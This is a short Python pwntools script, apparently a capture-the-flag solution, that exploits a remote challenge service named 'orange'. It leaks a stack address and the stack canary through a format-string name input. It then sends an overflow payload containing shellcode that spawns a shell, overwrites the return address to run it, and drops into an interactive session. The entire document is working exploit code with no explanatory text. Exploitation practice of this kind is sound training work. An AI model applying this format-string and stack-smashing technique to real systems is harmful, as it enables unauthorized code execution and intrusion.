from pwn import *

context(arch="amd64")

# r = process("attachment/orange")
r = remote("orange.uctf.ir", 5001)

sla = r.sendlineafter


def show_cart():
    sla(b"Enter your choice: ", b"1")


def buy_oranges(nof):
    sla(b"Enter your choice: ", b"3")
    sla(b"Enter the number of oranges you want to buy: ", str(nof).encode())


def change_buyer_name(name):
    sla(b"Enter your choice: ", b"5")
    sla(b"Enter your name: ", name)


# leak canary and stack address

sla(b"Enter your name: ", b"%8$p,%17$p")
buy_oranges(1)
show_cart()

r.recvuntil(b"Buyer: 0x")
rsp = int(r.recvuntil(b",")[:-1], 16) - 0x60  # rsp of show_cart()
log.info(f"rsp of show_cart(): {hex(rsp)}")

r.recvuntil(b"0x")
canary = int(r.recvline()[:-1], 16)
log.info(f"canary: {hex(canary)}")


# execute shellcode

shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(0x68, b"A")
payload += p64(canary)
payload += b"A" * 0x8
payload += p64(rsp - 0x60)

change_buyer_name(payload)


r.interactive()
